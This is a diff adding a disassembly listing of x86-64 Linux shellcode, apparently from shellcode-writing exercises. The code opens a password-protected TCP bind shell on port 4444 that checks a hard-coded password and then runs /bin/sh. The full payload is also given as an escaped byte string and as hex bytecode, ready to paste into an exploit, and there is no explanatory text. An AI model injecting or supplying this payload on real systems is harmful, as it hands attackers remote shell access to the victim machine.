@@ -1,0 +1,92 @@
+
+tcp-bind-shell-auth.elf64:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000400080 <_start>:
+  400080:	4d 31 f6             	xor    r14,r14
+  400083:	6a 29                	push   0x29
+  400085:	58                   	pop    rax
+  400086:	6a 02                	push   0x2
+  400088:	5f                   	pop    rdi
+  400089:	6a 01                	push   0x1
+  40008b:	5e                   	pop    rsi
+  40008c:	99                   	cdq    
+  40008d:	0f 05                	syscall 
+  40008f:	48 89 c7             	mov    rdi,rax
+  400092:	48 83 ec 08          	sub    rsp,0x8
+  400096:	44 89 74 24 04       	mov    DWORD PTR [rsp+0x4],r14d
+  40009b:	66 c7 44 24 02 11 5c 	mov    WORD PTR [rsp+0x2],0x5c11
+  4000a2:	49 8d 46 02          	lea    rax,[r14+0x2]
+  4000a6:	66 89 04 24          	mov    WORD PTR [rsp],ax
+  4000aa:	6a 31                	push   0x31
+  4000ac:	58                   	pop    rax
+  4000ad:	48 89 e6             	mov    rsi,rsp
+  4000b0:	6a 10                	push   0x10
+  4000b2:	5a                   	pop    rdx
+  4000b3:	0f 05                	syscall 
+  4000b5:	6a 32                	push   0x32
+  4000b7:	58                   	pop    rax
+  4000b8:	6a 02                	push   0x2
+  4000ba:	5e                   	pop    rsi
+  4000bb:	0f 05                	syscall 
+  4000bd:	6a 2b                	push   0x2b
+  4000bf:	58                   	pop    rax
+  4000c0:	48 83 ec 10          	sub    rsp,0x10
+  4000c4:	48 89 e6             	mov    rsi,rsp
+  4000c7:	c6 44 24 ff 10       	mov    BYTE PTR [rsp-0x1],0x10
+  4000cc:	48 83 ec 01          	sub    rsp,0x1
+  4000d0:	48 89 e2             	mov    rdx,rsp
+  4000d3:	0f 05                	syscall 
+  4000d5:	49 89 c1             	mov    r9,rax
+  4000d8:	6a 03                	push   0x3
+  4000da:	58                   	pop    rax
+  4000db:	0f 05                	syscall 
+
+00000000004000dd <read_pass>:
+  4000dd:	4c 89 f0             	mov    rax,r14
+  4000e0:	4c 89 cf             	mov    rdi,r9
+  4000e3:	6a 04                	push   0x4
+  4000e5:	5a                   	pop    rdx
+  4000e6:	48 29 d4             	sub    rsp,rdx
+  4000e9:	48 89 e6             	mov    rsi,rsp
+  4000ec:	0f 05                	syscall 
+  4000ee:	48 b8 45 49 4e 21 4c 	movabs rax,0x4d54454c214e4945
+  4000f5:	45 54 4d 
+  4000f8:	48 89 f7             	mov    rdi,rsi
+  4000fb:	48 af                	scas   rax,QWORD PTR es:[rdi]
+  4000fd:	75 de                	jne    4000dd <read_pass>
+  4000ff:	6a 02                	push   0x2
+  400101:	41 5f                	pop    r15
+
+0000000000400103 <loop_through_stdfds>:
+  400103:	4c 89 cf             	mov    rdi,r9
+  400106:	6a 21                	push   0x21
+  400108:	58                   	pop    rax
+  400109:	4c 89 fe             	mov    rsi,r15
+  40010c:	0f 05                	syscall 
+  40010e:	49 ff cf             	dec    r15
+  400111:	79 f0                	jns    400103 <loop_through_stdfds>
+  400113:	4c 89 f2             	mov    rdx,r14
+  400116:	41 56                	push   r14
+  400118:	48 bb 2f 2f 62 69 6e 	movabs rbx,0x68732f6e69622f2f
+  40011f:	2f 73 68 
+  400122:	53                   	push   rbx
+  400123:	48 89 e7             	mov    rdi,rsp
+  400126:	41 56                	push   r14
+  400128:	48 89 e2             	mov    rdx,rsp
+  40012b:	57                   	push   rdi
+  40012c:	48 89 e6             	mov    rsi,rsp
+  40012f:	6a 3b                	push   0x3b
+  400131:	58                   	pop    rax
+  400132:	0f 05                	syscall 
+===================================
+SHELLCODE:
+\x4d\x31\xf6\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05\x48\x89\xc7\x48\x83\xec\x08\x44\x89\x74\x24\x04\x66\xc7\x44\x24\x02\x11\x5c\x49\x8d\x46\x02\x66\x89\x04\x24\x6a\x31\x58\x48\x89\xe6\x6a\x10\x5a\x0f\x05\x6a\x32\x58\x6a\x02\x5e\x0f\x05\x6a\x2b\x58\x48\x83\xec\x10\x48\x89\xe6\xc6\x44\x24\xff\x10\x48\x83\xec\x01\x48\x89\xe2\x0f\x05\x49\x89\xc1\x6a\x03\x58\x0f\x05\x4c\x89\xf0\x4c\x89\xcf\x6a\x04\x5a\x48\x29\xd4\x48\x89\xe6\x0f\x05\x48\xb8\x45\x49\x4e\x21\x4c\x45\x54\x4d\x48\x89\xf7\x48\xaf\x75\xde\x6a\x02\x41\x5f\x4c\x89\xcf\x6a\x21\x58\x4c\x89\xfe\x0f\x05\x49\xff\xcf\x79\xf0\x4c\x89\xf2\x41\x56\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x41\x56\x48\x89\xe2\x57\x48\x89\xe6\x6a\x3b\x58\x0f\x05
+-- -- -- -- --
+SHELLCODE LENGHT: 360
+-- -- -- -- --
+SHELLCODE BYTECODE: 
+ 4d 31 f6 6a 29 58 6a 02 5f 6a 01 5e 99 0f 05 48 89 c7 48 83 ec 08 44 89 74 24 04 66 c7 44 24 02 11 5c 49 8d 46 02 66 89 04 24 6a 31 58 48 89 e6 6a 10 5a 0f 05 6a 32 58 6a 02 5e 0f 05 6a 2b 58 48 83 ec 10 48 89 e6 c6 44 24 ff 10 48 83 ec 01 48 89 e2 0f 05 49 89 c1 6a 03 58 0f 05 4c 89 f0 4c 89 cf 6a 04 5a 48 29 d4 48 89 e6 0f 05 48 b8 45 49 4e 21 4c 45 54 4d 48 89 f7 48 af 75 de 6a 02 41 5f 4c 89 cf 6a 21 58 4c 89 fe 0f 05 49 ff cf 79 f0 4c 89 f2 41 56 48 bb 2f 2f 62 69 6e 2f 73 68 53 48 89 e7 41 56 48 89 e2 57 48 89 e6 6a 3b 58 0f 05
+-- -- -- -- --
